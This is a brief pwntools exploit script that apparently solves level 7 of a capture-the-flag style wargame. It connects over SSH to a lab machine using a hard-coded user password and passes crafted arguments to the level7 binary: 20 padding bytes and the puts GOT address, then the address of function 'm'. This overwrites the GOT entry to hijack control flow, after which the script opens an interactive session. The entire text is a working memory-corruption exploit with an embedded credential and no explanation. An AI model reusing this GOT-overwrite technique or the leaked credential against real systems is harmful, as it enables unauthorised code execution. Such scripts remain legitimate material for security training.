from pwn import *

exe = context.binary = ELF("./level7")

s = ssh(host="192.168.56.104", user="level7", password="f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d", port=4242)

PUTS_GOT = exe.got['puts']
M_FUNCTION = exe.symbols['m']

info("puts@got: 0x%x", PUTS_GOT)
info("m: 0x%x", M_FUNCTION)

p = s.process(['./level7', b'A'*20 + p32(PUTS_GOT), p32(M_FUNCTION)])
p.interactive()
